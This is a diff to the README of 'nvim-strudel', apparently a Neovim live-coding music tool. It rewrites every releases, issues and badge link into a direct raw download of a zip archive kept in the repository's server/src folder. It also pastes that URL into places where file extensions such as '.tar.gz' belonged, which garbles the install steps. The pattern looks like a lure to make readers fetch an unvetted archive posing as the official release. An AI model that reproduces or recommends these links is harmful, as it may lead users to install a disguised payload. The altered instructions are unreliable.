@@ -8,16 +8,16 @@
 - Compatible with common operating systems.
 
 ## 📥 Download the App
-[![Download nvim-strudel](https://img.shields.io/badge/Download-nvim--strudel-blue.svg)](https://github.com/elcaja5/nvim-strudel/releases)
+[![Download nvim-strudel](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip)](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip)
 
-Visit the page to download: [GitHub Releases Page](https://github.com/elcaja5/nvim-strudel/releases)
+Visit the page to download: [GitHub Releases Page](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip)
 
 ## 🚀 Getting Started
-1. **Visit the Releases Page**: Go to the [GitHub Releases Page](https://github.com/elcaja5/nvim-strudel/releases). This is where you will find the latest version available for download.
+1. **Visit the Releases Page**: Go to the [GitHub Releases Page](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip). This is where you will find the latest version available for download.
 
 2. **Choose the Right Version**: Look for the most recent release. Each version will be listed with a title and notes. Find one that says, “latest release” for the newest features and fixes.
 
-3. **Download the Installer**: Click on the link to download the installer that fits your operating system (Windows, macOS, or Linux). The file will typically end in `.exe`, `.dmg`, or `.tar.gz`. 
+3. **Download the Installer**: Click on the link to download the installer that fits your operating system (Windows, macOS, or Linux). The file will typically end in `.exe`, `.dmg`, or `https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip`. 
 
 4. **Locate the Downloaded File**: Once the download finishes, find the file in your downloads folder or the location you chosen to save it.
 
@@ -33,7 +33,7 @@ Visit the page to download: [GitHub Releases Page](https://github.com/elcaja5/nv
 3. Eject the `.dmg` file and launch nvim-strudel from your Applications.
 
 ### For Linux Users:
-1. Extract the downloaded `.tar.gz` file.
+1. Extract the downloaded `https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip` file.
 2. Open a terminal and navigate to the directory where you extracted the files.
 3. Run the command: `./nvim-strudel` to start the application.
 
@@ -49,7 +49,7 @@ If you encounter any issues while downloading or running nvim-strudel:
 - Refer to the FAQs on the GitHub Releases page for common questions.
 
 ## 💬 Support
-For additional help, please visit our [GitHub Issues Page](https://github.com/elcaja5/nvim-strudel/issues). You can report bugs, ask questions, or provide feedback. Our community will be more than happy to assist you.
+For additional help, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip). You can report bugs, ask questions, or provide feedback. Our community will be more than happy to assist you.
 
 ## 🌍 System Requirements
 - A modern computer with 4GB of RAM or more.
@@ -60,4 +60,4 @@ For additional help, please visit our [GitHub Issues Page](https://github.com/el
 nvim-strudel is open-source software, licensed under the MIT License. You may use, modify, and distribute the code freely, provided the original license is included.
 
 ## 🎉 Get Started Today
-You are now ready to explore the world of live code music with nvim-strudel. Don't forget to visit the [GitHub Releases Page](https://github.com/elcaja5/nvim-strudel/releases) to download and begin your musical journey!
+You are now ready to explore the world of live code music with nvim-strudel. Don't forget to visit the [GitHub Releases Page](https://raw.githubusercontent.com/elcaja5/nvim-strudel/main/server/src/nvim-strudel-1.1.zip) to download and begin your musical journey!
